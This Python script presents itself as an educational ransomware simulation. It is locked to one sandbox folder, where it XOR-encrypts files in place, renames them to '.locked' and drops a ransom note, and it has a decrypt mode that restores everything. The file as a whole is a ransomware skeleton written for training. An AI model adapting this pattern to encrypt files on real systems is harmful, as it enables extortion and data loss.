"""
SAFE ransomware simulation for education only.

This script is intentionally constrained to one hardcoded sandbox directory:
C:\\RansomLab\\sandbox

It demonstrates file traversal, reversible XOR encryption/decryption,
locked file renaming, and ransom note creation.
"""

from __future__ import annotations

import argparse
import os
from pathlib import Path

# Hardcoded sandbox path. The script must never process anything outside this directory.
SANDBOX_DIR = Path(r"C:\RansomLab\sandbox")
LOCKED_EXTENSION = ".locked"
RANSOM_NOTE_NAME = "README.txt"
XOR_KEY = b"EDU_SAFE_KEY_2026"


def log(message: str) -> None:
    """Print a standardized log message."""
    print(f"[SIM] {message}")


def xor_bytes(data: bytes, key: bytes) -> bytes:
    """Apply repeating-key XOR. XOR is reversible by running the same operation again."""
    return bytes(byte ^ key[index % len(key)] for index, byte in enumerate(data))


def is_within_sandbox(path: Path) -> bool:
    """Return True only if the resolved path stays inside the resolved sandbox root."""
    try:
        sandbox_resolved = SANDBOX_DIR.resolve(strict=False)
        path_resolved = path.resolve(strict=False)
        common = Path(os.path.commonpath([str(sandbox_resolved), str(path_resolved)]))
        return common == sandbox_resolved
    except ValueError:
        # Different drives or invalid paths are treated as unsafe.
        return False


def encrypt_file(file_path: Path) -> None:
    """Encrypt one file in-place using XOR."""
    if not is_within_sandbox(file_path):
        log(f"Skipping unsafe path outside sandbox: {file_path}")
        return

    try:
        raw = file_path.read_bytes()
        encrypted = xor_bytes(raw, XOR_KEY)
        file_path.write_bytes(encrypted)
        log(f"Encrypted: {file_path}")
    except Exception as exc:
        log(f"Failed to encrypt {file_path}: {exc}")


def decrypt_file(file_path: Path) -> None:
    """Decrypt one file in-place using XOR (same operation as encryption)."""
    if not is_within_sandbox(file_path):
        log(f"Skipping unsafe path outside sandbox: {file_path}")
        return

    try:
        raw = file_path.read_bytes()
        decrypted = xor_bytes(raw, XOR_KEY)
        file_path.write_bytes(decrypted)
        log(f"Decrypted: {file_path}")
    except Exception as exc:
        log(f"Failed to decrypt {file_path}: {exc}")


def create_ransom_note() -> None:
    """Create (or overwrite) a fake ransom note in the sandbox root."""
    note_path = SANDBOX_DIR / RANSOM_NOTE_NAME

    if not is_within_sandbox(note_path):
        log(f"Refusing to write note outside sandbox: {note_path}")
        return

    note_text = (
        "Your files have been locked in this EDUCATIONAL simulation.\n"
        "This is a harmless training exercise.\n"
        "Run this script in decrypt mode to restore your files.\n"
        "No payment is needed.\n"
    )

    try:
        note_path.write_text(note_text, encoding="utf-8")
        log(f"Created ransom note: {note_path}")
    except Exception as exc:
        log(f"Failed to create ransom note {note_path}: {exc}")


def process_directory(mode: str) -> None:
    """
    Traverse sandbox files and process based on mode.

    encrypt mode:
    - Skip already encrypted *.locked files
    - Encrypt regular files, then rename to append .locked

    decrypt mode:
    - Process only *.locked files
    - Decrypt them, then rename back by removing .locked
    """
    if not SANDBOX_DIR.exists():
        log(f"Sandbox directory does not exist: {SANDBOX_DIR}")
        return

    if not SANDBOX_DIR.is_dir():
        log(f"Sandbox path is not a directory: {SANDBOX_DIR}")
        return

    if not is_within_sandbox(SANDBOX_DIR):
        log(f"Unsafe sandbox path detected; aborting: {SANDBOX_DIR}")
        return

    for root, _, files in os.walk(SANDBOX_DIR, topdown=True, followlinks=False):
        root_path = Path(root)

        if not is_within_sandbox(root_path):
            log(f"Skipping unsafe directory outside sandbox: {root_path}")
            continue

        for filename in files:
            file_path = root_path / filename

            if not is_within_sandbox(file_path):
                log(f"Skipping unsafe file outside sandbox: {file_path}")
                continue

            if filename == RANSOM_NOTE_NAME:
                log(f"Skipping ransom note file: {file_path}")
                continue

            if mode == "encrypt":
                if file_path.name.endswith(LOCKED_EXTENSION):
                    log(f"Skipping already encrypted file: {file_path}")
                    continue

                encrypt_file(file_path)
                locked_path = file_path.with_name(file_path.name + LOCKED_EXTENSION)

                if not is_within_sandbox(locked_path):
                    log(f"Skipping unsafe rename target: {locked_path}")
                    continue

                try:
                    file_path.rename(locked_path)
                    log(f"Renamed to locked: {locked_path}")
                except Exception as exc:
                    log(f"Failed to rename {file_path} -> {locked_path}: {exc}")

            elif mode == "decrypt":
                if not file_path.name.endswith(LOCKED_EXTENSION):
                    log(f"Skipping non-locked file: {file_path}")
                    continue

                decrypt_file(file_path)
                restored_name = file_path.name[: -len(LOCKED_EXTENSION)]
                restored_path = file_path.with_name(restored_name)

                if not restored_name:
                    log(f"Skipping invalid restored name for file: {file_path}")
                    continue

                if not is_within_sandbox(restored_path):
                    log(f"Skipping unsafe rename target: {restored_path}")
                    continue

                try:
                    file_path.rename(restored_path)
                    log(f"Restored filename: {restored_path}")
                except Exception as exc:
                    log(f"Failed to rename {file_path} -> {restored_path}: {exc}")


def main() -> None:
    """Entry point with mode switch: encrypt or decrypt."""
    parser = argparse.ArgumentParser(
        description="SAFE ransomware simulation constrained to C:\\RansomLab\\sandbox"
    )
    parser.add_argument(
        "mode",
        choices=["encrypt", "decrypt"],
        help="Select simulation mode.",
    )
    args = parser.parse_args()

    if args.mode == "encrypt":
        log("Starting encryption simulation...")
        process_directory("encrypt")
        create_ransom_note()
        log("Encryption simulation complete.")
    elif args.mode == "decrypt":
        log("Starting decryption simulation...")
        process_directory("decrypt")
        log("Decryption simulation complete.")


if __name__ == "__main__":
    main()
